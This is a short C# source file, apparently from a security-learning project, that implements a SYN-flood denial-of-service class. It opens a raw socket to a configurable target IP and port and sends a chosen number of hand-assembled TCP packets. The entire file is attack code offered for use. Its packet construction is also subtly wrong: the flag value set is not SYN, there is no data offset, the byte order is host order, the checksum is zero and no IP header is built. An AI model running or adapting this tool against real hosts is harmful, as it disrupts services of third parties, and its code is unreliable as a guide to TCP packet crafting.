using System.Net;
using System.Net.Sockets;

namespace LD.InfoSec.Network.DoS;

public class DosAttack(AttackOptions options)
{
    public async Task Start()
    {
        if (options.DosType == DosType.SynFlood)
        {
            await StartSynFlood();    
        }
    }

    private async Task StartSynFlood()
    {
        using Socket socket = new(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Raw);
        IPAddress ipAddress = IPAddress.Parse(options.TargetIp);
        IPEndPoint ipEndPoint = new(ipAddress, options.TargetPort);
        await socket.ConnectAsync(ipEndPoint);
        
        for (int index = 0; index < options.Size; index++)
        {
            await socket.SendAsync(GetSynFloodPacketBytes());
        }
    }

    private ArraySegment<byte> GetSynFloodPacketBytes()
    {
        const uint sequenceNumber = 0;
        const uint acknowledgmentNumber = 0;
        const ushort dataOffsetAndFlags = 1;
        const ushort windowSize = 0;
        const ushort checksum = 0;
        const ushort urgentPointer = 0;
        const ushort tcpOptions = 0;
        const ushort padding = 0;
        const uint data = 0;

        MemoryStream stream = new();
        stream.Write(BitConverter.GetBytes(options.SourcePort), 0, 2);
        stream.Write(BitConverter.GetBytes(options.TargetPort), 0, 2);
        stream.Write(BitConverter.GetBytes(sequenceNumber), 0, 4);
        stream.Write(BitConverter.GetBytes(acknowledgmentNumber), 0, 4);
        stream.Write(BitConverter.GetBytes(dataOffsetAndFlags), 0, 2);
        stream.Write(BitConverter.GetBytes(windowSize), 0, 2);
        stream.Write(BitConverter.GetBytes(checksum), 0, 2);
        stream.Write(BitConverter.GetBytes(urgentPointer), 0, 2);
        stream.Write(BitConverter.GetBytes(tcpOptions), 0, 2);
        stream.Write(BitConverter.GetBytes(padding), 0, 2);
        stream.Write(BitConverter.GetBytes(data), 0, 4);
        
        byte[] packetBytes = stream.ToArray();
        return new ArraySegment<byte>(packetBytes);
    }
}
